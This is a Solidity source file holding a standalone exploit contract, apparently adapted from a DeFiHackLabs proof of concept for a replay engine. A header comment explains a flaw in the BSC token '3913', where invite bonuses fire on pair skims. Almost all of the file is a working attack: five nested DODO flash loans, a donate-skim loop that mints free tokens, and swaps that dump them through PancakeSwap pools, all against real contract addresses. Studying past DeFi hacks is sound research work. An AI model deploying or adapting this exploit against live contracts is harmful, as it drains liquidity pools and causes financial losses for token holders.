// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic standalone exploit for the EVM Playground (2023-11-3913).
//
// The DeFiHackLabs PoC runs the attack INLINE in a Foundry `Test`-derived
// contract (`test/3913_exp.sol`) using cheatcodes (`cheats.createSelectFork`,
// `cheats.label`, `deal`) and forge-std sanity checks (`emit
// log_named_decimal_uint`, `assertEq`, `assert`) — none of which exist in
// this project's cheatcode-free @ethereumjs/vm replay engine. This file is a
// faithful, self-contained copy of the inline attack (testExploit body, the
// nested 5-level `DPPFlashLoanCall` callback, and the `NewContract` helper),
// with every cheatcode/test-only call stripped:
//   - `deal(address(busd), address(this), 0)` is a no-op here — a freshly
//     deployed contract already holds 0 of the BUSD/BSC-USD token.
//   - `emit log_named_decimal_uint(...)` is pure logging, dropped.
//   - every `assertEq`/`assert` is a sanity check on the researcher's own
//     recorded historical values with NO side effect used later in the
//     attack (the actual swap/transfer amounts are computed independently
//     via `getAmountsOut`/`balanceOf`), so dropping them changes nothing
//     about the attack's mechanics or its profit.
//
// Root cause (see 3913_exp.md for the full writeup): the vulnerable BEP-20
// token "3913" (0xd74F28c6E0E2c09881Ef2d9445F158833c174775) wires two
// unrelated MLM payout mechanisms onto plain ERC20 transfers:
//   1. any transfer TO a PancakeSwap pair calls the permissionless
//      `burnPairs()`, which tops up a `_smartVault_invite` vault with a
//      slice of the (attacker-inflated) pair balance;
//   2. any transfer FROM a pair calls `_inviteBonus()`, which pays the
//      recipient's registered "inviter" 6% of the transferred amount OUT OF
//      that same vault — tokens that are not deducted from anyone in the
//      trade.
// Because a pair's `balanceOf` reports its raw, un-discounted balance,
// donating tokens into the pair and then calling PancakeSwap's permissionless
// `pair.skim()` re-enters `_transfer(pair -> helper)`, firing the invite
// bonus again on the full skimmed amount. Looping donate -> skim -> reclaim
// (with an occasional direct `burnPairs()` call to keep the vault funded)
// lets the attacker mint itself phantom "3913" for free, which is then dumped
// through the BUSD and 9419 pools for real profit. The whole loop is funded
// via a 5-level nested DODO V2 flash loan, so it costs the attacker zero
// capital.

interface IERC20x {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IDodo {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface I3913 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function burnPairs() external;
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    // NOTE: unlike swapExactTokensForTokens, the FeeOnTransfer variant returns
    // nothing on PancakeSwap/UniswapV2 routers (see interface.sol in the
    // registry) — declaring a return type here would make Solidity try to
    // ABI-decode a dynamic array out of the empty return data and revert.
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
}

contract Exploit {
    I3913 constant vulnerable = I3913(0xd74F28c6E0E2c09881Ef2d9445F158833c174775);
    IPancakePair constant pair = IPancakePair(0x715762906489D5D671eA3eC285731975DA617583);
    IPancakePair constant pair3913to9419 = IPancakePair(0xd6d66e1993140966e6029815eDbB246800928969);
    IPancakeRouter constant router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant dodo1 = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;
    address constant dodo2 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    address constant dodo3 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address constant dodo4 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address constant dodo5 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    IERC20x constant busd = IERC20x(0x55d398326f99059fF775485246999027B3197955);
    IERC20x constant token9419 = IERC20x(0x86335cb69e4E28fad231dAE3E206ce90849a5477);
    address constant smartVaultInvite = 0x570C19331c1B155C21ccD6C2D8e264785cc6F015;

    uint256 dodo1FlashLoanAmount;
    uint256 dodo2FlashLoanAmount;
    uint256 dodo3FlashLoanAmount;
    uint256 dodo4FlashLoanAmount;
    uint256 dodo5FlashLoanAmount;

    // entrypoint: kick off the 5-level nested DODO flash loan (no capital required)
    function run() external {
        dodo1FlashLoanAmount = busd.balanceOf(dodo1);
        IDodo(dodo1).flashLoan(0, dodo1FlashLoanAmount, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == dodo1) {
            dodo2FlashLoanAmount = busd.balanceOf(dodo2);
            IDodo(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));
            busd.transfer(dodo1, dodo1FlashLoanAmount);
        } else if (msg.sender == dodo2) {
            dodo3FlashLoanAmount = busd.balanceOf(dodo3);
            IDodo(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));
            busd.transfer(dodo2, dodo2FlashLoanAmount);
        } else if (msg.sender == dodo3) {
            dodo4FlashLoanAmount = busd.balanceOf(dodo4);
            IDodo(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));
            busd.transfer(dodo3, dodo3FlashLoanAmount);
        } else if (msg.sender == dodo4) {
            dodo5FlashLoanAmount = busd.balanceOf(dodo5);
            IDodo(dodo5).flashLoan(0, dodo5FlashLoanAmount, address(this), new bytes(1));
            busd.transfer(dodo4, dodo4FlashLoanAmount);
        } else if (msg.sender == dodo5) {
            // end of the nested flash loan — the actual attack starts here, fully
            // funded by dodo5's BUSD (all five loans are repaid at the end of this branch)
            busd.approve(address(pair), type(uint256).max);
            busd.approve(address(router), type(uint256).max);

            address[] memory path = new address[](2);
            path[0] = address(busd);
            path[1] = address(vulnerable);
            router.swapExactTokensForTokens(10 ether, 0, path, address(this), block.timestamp + 100);
            path[1] = address(token9419);
            router.swapExactTokensForTokens(10 ether, 0, path, address(this), block.timestamp + 100);
            NewContract x = new NewContract();

            // establish the invite relationship: x.pid = attacker, so _inviteBonus
            // pays THIS contract whenever a pair sends tokens to x
            vulnerable.transfer(address(x), 1 ether);
            x.transferToken(address(vulnerable), address(this));

            path[1] = address(vulnerable);
            router.swapExactTokensForTokens(
                358_631_959_260_537_946_706_184, 0, path, address(this), block.timestamp + 100
            );
            // attacker 3913 balance is now ~650.5e27 — the principal to cycle
            busd.transfer(address(pair), 1);
            vulnerable.transfer(address(pair), vulnerable.balanceOf(address(this)));
            pair.skim(address(x));

            // donate -> skim -> reclaim loop: each cycle mints a free 6% invite
            // bonus out of _smartVault_invite; occasionally top the vault back up
            // via a direct burnPairs() call so the loop can keep running
            uint8 i = 0;
            while (i < 10) {
                x.transferToken(address(vulnerable), address(this));
                if (vulnerable.balanceOf(smartVaultInvite) != 1e15) {
                    busd.transfer(address(pair), 1);
                    vulnerable.transfer(address(pair), vulnerable.balanceOf(address(this)));
                    pair.skim(address(x));
                } else {
                    vulnerable.burnPairs();
                }
                i++;
            }
            // attacker 3913 balance is now ~873.3e27 — +222.8e27 for free

            path[0] = address(vulnerable);
            path[1] = address(busd);
            uint256[] memory amountOut = router.getAmountsOut(vulnerable.balanceOf(address(this)) * 98 / 100, path);

            busd.transfer(address(pair), 1);
            vulnerable.transfer(address(pair), amountOut[0]);
            pair.swap(amountOut[1] * 99 / 100, 0, address(this), new bytes(0));

            path[0] = address(vulnerable);
            path[1] = address(token9419);
            amountOut = router.getAmountsOut(vulnerable.balanceOf(address(this)), path);
            token9419.transfer(address(pair3913to9419), 1);
            vulnerable.transfer(address(pair3913to9419), vulnerable.balanceOf(address(this)));
            pair3913to9419.swap(amountOut[1] * 99 / 100, 0, address(this), new bytes(0));

            path[0] = address(token9419);
            path[1] = address(busd);
            token9419.approve(address(router), type(uint256).max);
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                token9419.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100
            );
            busd.transfer(dodo5, dodo5FlashLoanAmount);
        }
    }
}

contract NewContract {
    function transferToken(address token, address destination) external {
        uint256 bal = I3913(token).balanceOf(address(this));
        I3913(token).transfer(destination, bal);
    }
}
